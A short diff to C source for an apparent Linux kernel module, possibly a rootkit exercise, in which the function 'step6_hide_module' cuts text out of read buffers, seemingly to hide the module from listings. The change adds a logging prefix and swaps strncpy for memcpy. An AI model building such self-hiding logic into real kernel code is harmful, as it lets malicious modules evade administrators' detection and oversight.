@@ -1,3 +1,5 @@
+#define pr_fmt(fmt) KBUILD_MODNAME ": " fmt
+
 #include "step6.h"
 #include <linux/string.h>
 
@@ -41,7 +43,7 @@ ssize_t step6_hide_module(char *read_block_id, char *read_path, char *read_buffe
         if (offset + delete_length != read_buffer_size) {
             char *copy_from_ptr = delete_from_ptr + delete_length;
             unsigned long left_to_copy = read_buffer_size - offset - delete_length;
-            strncpy(delete_from_ptr, copy_from_ptr, left_to_copy);
+            memcpy(delete_from_ptr, copy_from_ptr, left_to_copy);
         }
         return (ssize_t)(read_buffer_size - delete_length);
     }
